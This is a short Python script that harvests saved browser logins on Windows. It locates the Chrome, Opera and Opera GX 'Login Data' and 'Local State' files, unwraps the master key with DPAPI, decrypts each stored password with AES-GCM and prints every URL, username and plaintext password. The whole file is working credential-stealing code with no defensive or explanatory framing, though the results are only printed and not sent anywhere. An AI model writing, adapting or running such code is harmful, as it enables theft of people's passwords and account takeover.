import sqlite3,json,os
from binascii import a2b_base64
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from shutil import copy2 # probably unnecessary

LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

L_DATA = [
    ROAMING+"\\Opera Software\\Opera GX Stable\\Login Data",
    ROAMING+"\\Opera Software\\Opera Stable\\Login Data",
    LOCAL+"\\Google\\Chrome\\User Data\\Default\\Login Data"
]
STATES = {
    L_DATA[0]:ROAMING+"\\Opera Software\\Opera GX Stable\\Local State",
    L_DATA[1]:ROAMING+"\\Opera Software\\Opera Stable\\Local State",
    L_DATA[2]:LOCAL+"\\Google\\Chrome\\User Data\\Local State"
}

def get_master_key(l_data_path:str):
    with open(STATES[l_data_path], "r") as f:
        try:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = a2b_base64(str(local_state["os_crypt"]["encrypted_key"]).encode('ascii'))
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except KeyError:
            return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        cipher = generate_cipher(master_key, buff[3:15])
        decrypted_pass = decrypt_payload(cipher, buff[15:])
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception:
        return str(buff).replace("\'","?")

for login_db in L_DATA:
    master_key = get_master_key(login_db)
    if master_key is None:
        continue
    copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    lines = []
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        print("\n\n")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            #print(str(type(username))+" "+str(type(encrypted_password)))
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if len(decrypted_password) > 0:
                lines.append(f'url: {url} usr: {username if username != "" else "x"} pw: {decrypted_password}')
        print('\n'.join(lines))

    except Exception as e:
        pass
    cursor.close()
    conn.close()
